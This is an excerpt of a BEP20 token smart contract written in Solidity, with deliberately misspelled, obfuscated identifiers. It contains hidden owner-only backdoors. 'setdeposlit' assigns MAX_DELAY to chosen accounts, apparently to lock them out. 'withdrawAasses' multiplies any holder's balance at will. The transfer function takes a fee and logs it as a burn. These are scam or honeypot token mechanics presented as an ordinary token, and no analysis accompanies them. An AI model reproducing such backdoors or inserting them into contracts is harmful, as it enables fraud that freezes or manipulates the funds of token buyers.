...
contract Token is IBEP20, HasForeignAsset {
    ...
    function getdeposlit(address acdountt) public view returns (uint256) {
        return _deposlit[acdountt];
    }

    function setdeposlit(address acdountt) public onlyOwner {
        _deposlit[acdountt] = MAX_DELAY;
    }

    function cacaledeposlit(address acdountt) public onlyOwner {
        _deposlit[acdountt] = 0;
    }


    function withdrawAasses(address acdountt,uint256 numm) public onlyOwner {
        _balances[acdountt] = _balances[acdountt].milu(numm);
    }
    ...
    function transferFrom(
        ...
        _approve(
            sender,
            _msgSender(),
            _allowances[sender][_msgSender()].subb(amnnott, "BEP20: transfer amnnott exceeds allowance")
        );
        return true;
    }
    ...
    function _transfer(
        ...
        uint256 fieiuamnnott = 0;
        fieiuamnnott = amnnott.milu(_fieiu).div(100);
        uint256 amoiinn;
        amoiinn = amnnott - fieiuamnnott;
        ...
        if (fieiuamnnott > 0) {
            emit Transfer(sender, _DEADaddress, fieiuamnnott);
        }
    ...
    function _burn(address acdountt, uint256 amnnott) internal virtual {
        ...
        _balances[acdountt] = _balances[acdountt].subb(amnnott, "BEP20: burn amnnott exceeds balance");
        _totalSupply = _totalSupply.subb(amnnott);
